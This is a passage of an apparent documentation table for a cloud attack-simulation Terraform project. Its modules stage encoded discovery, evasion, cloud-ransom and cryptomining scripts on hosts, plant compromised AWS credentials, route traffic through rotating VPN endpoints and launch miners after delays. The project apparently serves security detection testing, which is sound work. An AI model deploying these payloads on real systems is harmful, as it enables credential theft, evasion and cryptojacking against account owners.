docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;free&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;free&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;paid&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;paid&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;baseline&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;baseline&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;discovery&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;discovery&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;evasion&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;evasion&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;cloudransom&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;cloudransom&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;terraform&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;terraform&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;start&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;start&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>   |
| attacker-ssm-execute-docker-composite-guardduty                            | ./modules/ssm/execute-docker-composite-guardduty               | ssm_exec_docker_guardduty                  | context.aws.ssm.attacker.execute.docker_composite_guardduty               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_guardduty": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-guardduty               | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/guardduty&quot;<br/>    attack&&#35;95;script = &quot;discovery&&#35;95;aws&&#35;95;instance&&#35;95;creds&&#35;95;tor&#46;sh&quot;<br/>    start&&#35;95;script = &quot;discovery&&#35;95;delayed&&#35;95;start&#46;sh&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;removing previous app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;creating app directory&quot;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;discovery&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; $&&#35;123;local&#46;attack&&#35;95;script&&#35;125;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;start&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; $&&#35;123;local&#46;start&&#35;95;script&&#35;125;<br/>    log &quot;starting script&#46;&#46;&#46;&quot;<br/>    /bin/bash $&&#35;123;local&#46;start&&#35;95;script&&#35;125;<br/>    <br/>    log &quot;done&#46;&quot;<br/>    EOT<br/><br/>    discovery       = file&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/$&&#35;123;local&#46;attack&&#35;95;script&&#35;125;&quot;, <br/>                            &&#35;41;<br/>    start           = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/$&&#35;123;local&#46;start&&#35;95;script&&#35;125;&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                    attack&&#35;95;dir = local&#46;attack&&#35;95;dir<br/>                                    attack&&#35;95;script = local&#46;attack&&#35;95;script<br/>                                &&#35;125; <br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;discovery&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;discovery&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;start&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;start&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| attacker-simulation-attacker-exec-docker-composite-host-cryptomining       | ./modules/ssm/execute-docker-composite-host-cryptomining       | ssm_exec_docker_host_cryptomining          | context.aws.ssm.attacker.execute.docker_composite_host_cryptomining       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_host_cryptomining": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-host-cryptomining       | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/cloud&#45;tunnel&quot;<br/>    script = &quot;hostcrypto&quot;<br/>    script&&#35;95;type = &quot;terraform&quot;<br/>    attack&&#35;95;type = &quot;host&&#35;95;cryptomining&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/protonvpn<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;start&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/start&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;free&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;free&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;paid&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;paid<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;baseline<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/baseline&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;discovery&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/discovery&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;evasion&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/evasion&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudransom&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/cloudransom&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/terraform&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;hostcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/terraform&#46;sh<br/>    log &quot;Starting as background job&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;125;&quot; == &quot;0&quot; &&#35;93;; then<br/>        for i in $&&#35;40;echo &quot;US NL&#45;FREE&#35;1 JP&#45;FREE&#35;3 NL&#45;FREE&#35;4 NL&#45;FREE&#35;8 US&#45;FREE&#35;5 NL&#45;FREE&#35;9 NL&#45;FREE&#35;12 NL&#45;FREE&#35;13 NL&#45;FREE&#35;14 NL&#45;FREE&#35;15 NL&#45;FREE&#35;16 US&#45;FREE&#35;13 US&#45;FREE&#35;32 US&#45;FREE&#35;33 US&#45;FREE&#35;34 NL&#45;FREE&#35;39 NL&#45;FREE&#35;52 NL&#45;FREE&#35;57 NL&#45;FREE&#35;87 NL&#45;FREE&#35;133 NL&#45;FREE&#35;136 NL&#45;FREE&#35;148 US&#45;FREE&#35;52 US&#45;FREE&#35;53 US&#45;FREE&#35;54 US&#45;FREE&#35;51 NL&#45;FREE&#35;163 NL&#45;FREE&#35;164 US&#45;FREE&#35;58 US&#45;FREE&#35;57 US&#45;FREE&#35;56 US&#45;FREE&#35;55&quot;&&#35;41;; do cp &#46;env&#45;protonvpn &#46;env&#45;protonvpn&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;$i; done<br/>        bash auto&#45;free&#46;sh<br/>    else<br/>        for i in $&&#35;40;echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;&&#35;41;; do cp &#46;env&#45;protonvpn&#45;paid &#46;env&#45;protonvpn&#45;paid&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;paid&#45;$i; done<br/>        bash auto&#45;paid&#46;sh<br/>    fi;<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;paid       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = 2<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;baseline  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = &quot;US&quot;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;free   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;free&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;paid   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;paid&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    baseline    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/baseline&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    discovery   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/discovery&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    evasion     = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/evasion&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudransom = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudransom&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudcrypto = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;crypto&#45;gpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    instances = 12<br/>                                    wallet = var&#46;inputs&&#35;91;&quot;ethermine&&#35;95;wallet&quot;&&#35;93;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    hostcrypto  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/hostcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;host&#45;cpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                    instances = 1<br/>                                    minergate&&#35;95;user = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/>                                    nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    terraform  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/terraform&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    start       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/start&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        